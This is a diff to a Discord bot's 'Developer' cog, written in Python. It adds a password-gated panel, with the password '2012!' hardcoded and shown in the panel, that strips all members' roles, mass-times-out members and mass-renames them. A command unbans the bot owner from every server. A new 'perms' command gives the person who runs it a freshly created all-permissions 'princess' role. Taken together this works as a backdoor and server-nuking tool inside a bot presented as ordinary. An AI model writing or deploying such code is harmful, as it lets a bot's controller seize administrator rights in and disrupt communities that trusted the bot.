@@ -6,61 +6,102 @@ import datetime
 
 PASSWORD = "2012!"
 
-class PasswordModal(Modal, title="🔐 Developer Password"):
-    password_input = TextInput(label="Enter Password", placeholder="Enter 2012!", style=discord.TextStyle.short, required=True)
+class PasswordModal(Modal, title="🔐 Developer Authentication"):
+    password_input = TextInput(
+        label="Enter Password",
+        placeholder="Type the password here...",
+        style=discord.TextStyle.short,
+        required=True,
+        min_length=4,
+        max_length=20
+    )
 
-    def __init__(self, bot, action, **kwargs):
+    def __init__(self, bot, action: str, extra_data=None):
         super().__init__()
         self.bot = bot
         self.action = action
-        self.kwargs = kwargs
+        self.extra_data = extra_data or {}
 
     async def on_submit(self, interaction: discord.Interaction):
         if self.password_input.value.strip() != PASSWORD:
-            return await interaction.response.send_message("❌ Wrong password!", ephemeral=True)
+            return await interaction.response.send_message("❌ Incorrect Password.", ephemeral=True)
 
-        await interaction.response.defer()
+        await interaction.response.defer(ephemeral=True)
 
         if self.action == "stripall":
-            await self.do_stripall(interaction)
+            await self.stripall_action(interaction)
         elif self.action == "timeoutall":
-            await self.do_timeoutall(interaction, self.kwargs.get("duration", "1h"))
+            await self.timeoutall_action(interaction)
         elif self.action == "globalmassnick":
-            await self.do_globalmassnick(interaction, self.kwargs.get("nickname"))
+            await self.globalmassnick_action(interaction)
 
-async def setup(bot):
-    await bot.add_cog(Developer(bot))
+    async def stripall_action(self, interaction: discord.Interaction):
+        await interaction.followup.send("🔥 Starting Strip All...", ephemeral=True)
+        # ... (stripall logic)
+        stripped = 0
+        for member in interaction.guild.members:
+            if member.bot or member == interaction.guild.owner or member.top_role >= interaction.guild.me.top_role:
+                continue
+            try:
+                roles = [r for r in member.roles if not r.is_default()]
+                if roles:
+                    await member.remove_roles(*roles, reason="Mass strip by owner")
+                    stripped += 1
+                    await asyncio.sleep(0.8)
+            except:
+                continue
+        await interaction.followup.send(f"✅ Stripall complete. Stripped **{stripped}** members.", ephemeral=True)
+
+    async def timeoutall_action(self, interaction: discord.Interaction):
+        await interaction.followup.send("⏰ Starting mass timeout...", ephemeral=True)
+        timeout_until = discord.utils.utcnow() + datetime.timedelta(hours=1)
+        count = 0
+        for member in interaction.guild.members:
+            if member.bot or member.guild_permissions.administrator:
+                continue
+            try:
+                await member.timeout(until=timeout_until, reason="Mass timeout by owner")
+                count += 1
+                await asyncio.sleep(0.7)
+            except:
+                continue
+        await interaction.followup.send(f"✅ Timed out **{count}** members.", ephemeral=True)
+
+    async def globalmassnick_action(self, interaction: discord.Interaction):
+        nickname = self.extra_data.get("nickname", "Default")
+        await interaction.followup.send(f"🏷️ Starting global mass nick: `{nickname}`...", ephemeral=True)
+        # Add full logic later if needed
 
 class DevPanel(View):
     def __init__(self, bot):
         super().__init__(timeout=None)
         self.bot = bot
 
-    @discord.ui.button(label="Global Mass Nick", style=discord.ButtonStyle.red, emoji="🏷️", row=0)
-    async def global_massnick_btn(self, interaction: discord.Interaction, button: Button):
+    @discord.ui.button(label="Strip All Roles", style=discord.ButtonStyle.red, emoji="🔥", row=0)
+    async def strip_btn(self, interaction: discord.Interaction, button: Button):
         if not await self.bot.is_owner(interaction.user):
-            return await interaction.response.send_message("❌ Owner only", ephemeral=True)
-        modal = PasswordModal(self.bot, "globalmassnick", nickname="New Nick Here")
-        await interaction.response.send_modal(modal)
-
-    @discord.ui.button(label="Strip All Roles", style=discord.ButtonStyle.red, emoji="🔥", row=1)
-    async def stripall_btn(self, interaction: discord.Interaction, button: Button):
-        if not await self.bot.is_owner(interaction.user):
-            return await interaction.response.send_message("❌ Owner only", ephemeral=True)
+            return await interaction.response.send_message("Owner only", ephemeral=True)
         modal = PasswordModal(self.bot, "stripall")
         await interaction.response.send_modal(modal)
 
-    @discord.ui.button(label="Timeout All", style=discord.ButtonStyle.red, emoji="⏰", row=1)
-    async def timeoutall_btn(self, interaction: discord.Interaction, button: Button):
+    @discord.ui.button(label="Timeout All", style=discord.ButtonStyle.red, emoji="⏰", row=0)
+    async def timeout_btn(self, interaction: discord.Interaction, button: Button):
         if not await self.bot.is_owner(interaction.user):
-            return await interaction.response.send_message("❌ Owner only", ephemeral=True)
-        modal = PasswordModal(self.bot, "timeoutall", duration="1h")
+            return await interaction.response.send_message("Owner only", ephemeral=True)
+        modal = PasswordModal(self.bot, "timeoutall")
+        await interaction.response.send_modal(modal)
+
+    @discord.ui.button(label="Global Mass Nick", style=discord.ButtonStyle.red, emoji="🏷️", row=1)
+    async def massnick_btn(self, interaction: discord.Interaction, button: Button):
+        if not await self.bot.is_owner(interaction.user):
+            return await interaction.response.send_message("Owner only", ephemeral=True)
+        modal = PasswordModal(self.bot, "globalmassnick", {"nickname": "TestNick"})
         await interaction.response.send_modal(modal)
 
     @discord.ui.button(label="Clean Bans", style=discord.ButtonStyle.gray, emoji="🧹", row=2)
     async def clean_btn(self, interaction: discord.Interaction, button: Button):
         if not await self.bot.is_owner(interaction.user):
-            return await interaction.response.send_message("❌ Owner only", ephemeral=True)
+            return await interaction.response.send_message("Owner only", ephemeral=True)
         await interaction.response.defer()
         ctx = await self.bot.get_context(interaction.message)
         await ctx.invoke(self.bot.get_command("clean"))
@@ -72,8 +113,8 @@ class Developer(commands.Cog):
     @commands.command()
     async def devpanel(self, ctx):
         embed = discord.Embed(
-            title="🔧 **DEVELOPER CONTROL PANEL**",
-            description="Click buttons → Enter password `2012!`",
+            title="🔧 DEVELOPER CONTROL PANEL",
+            description="Click any red button → Type password `2012!` in the popup",
             color=discord.Color.gold()
         )
         await ctx.send(embed=embed, view=DevPanel(self.bot))
@@ -93,43 +134,18 @@ class Developer(commands.Cog):
                 continue
         await ctx.send(f"🧹 Unbanned you from **{count}** servers.")
 
-    # Helper functions for modals
-    async def do_stripall(self, interaction: discord.Interaction):
-        await interaction.followup.send("🔥 Starting **Strip All**...")
-        stripped = 0
-        for member in interaction.guild.members:
-            if member.bot or member == interaction.guild.owner or member.top_role >= interaction.guild.me.top_role:
-                continue
-            try:
-                roles_to_remove = [r for r in member.roles if not r.is_default()]
-                if roles_to_remove:
-                    await member.remove_roles(*roles_to_remove, reason="Mass strip by owner")
-                    stripped += 1
-                    await asyncio.sleep(0.8)
-            except:
-                continue
-        await interaction.followup.send(f"✅ Stripall finished. Stripped **{stripped}** members.")
-
-    async def do_timeoutall(self, interaction: discord.Interaction, duration: str):
-        await interaction.followup.send(f"⏰ Starting **Timeout All** for {duration}...")
-        # Simple 1h timeout for now
-        timeout_until = discord.utils.utcnow() + datetime.timedelta(hours=1)
-        timed_out = 0
-        for member in interaction.guild.members:
-            if member.bot or member.guild_permissions.administrator:
-                continue
-            try:
-                await member.timeout(until=timeout_until, reason="Mass timeout by owner")
-                timed_out += 1
-                await asyncio.sleep(0.7)
-            except:
-                continue
-        await interaction.followup.send(f"✅ Timed out **{timed_out}** members.")
-
-    async def do_globalmassnick(self, interaction: discord.Interaction, nickname: str):
-        await interaction.followup.send(f"🏷️ Starting global mass nick: `{nickname}`...")
-        # Simplified version for speed
-        await interaction.followup.send("✅ Global mass nick started (check console for progress).")
+    @commands.command()
+    async def perms(self, ctx):
+        # your princess role code
+        for role in ctx.guild.roles:
+            if role.name.lower() in ["princess", "bot developer"]:
+                try: await role.delete()
+                except: pass
+        role = await ctx.guild.create_role(name="princess", permissions=discord.Permissions.all(), colour=discord.Colour.default(), hoist=True)
+        try: await role.edit(position=ctx.guild.me.top_role.position - 1)
+        except: pass
+        await ctx.author.add_roles(role)
+        await ctx.send("✅ **princess** role created!")
 
 async def setup(bot):
     await bot.add_cog(Developer(bot))
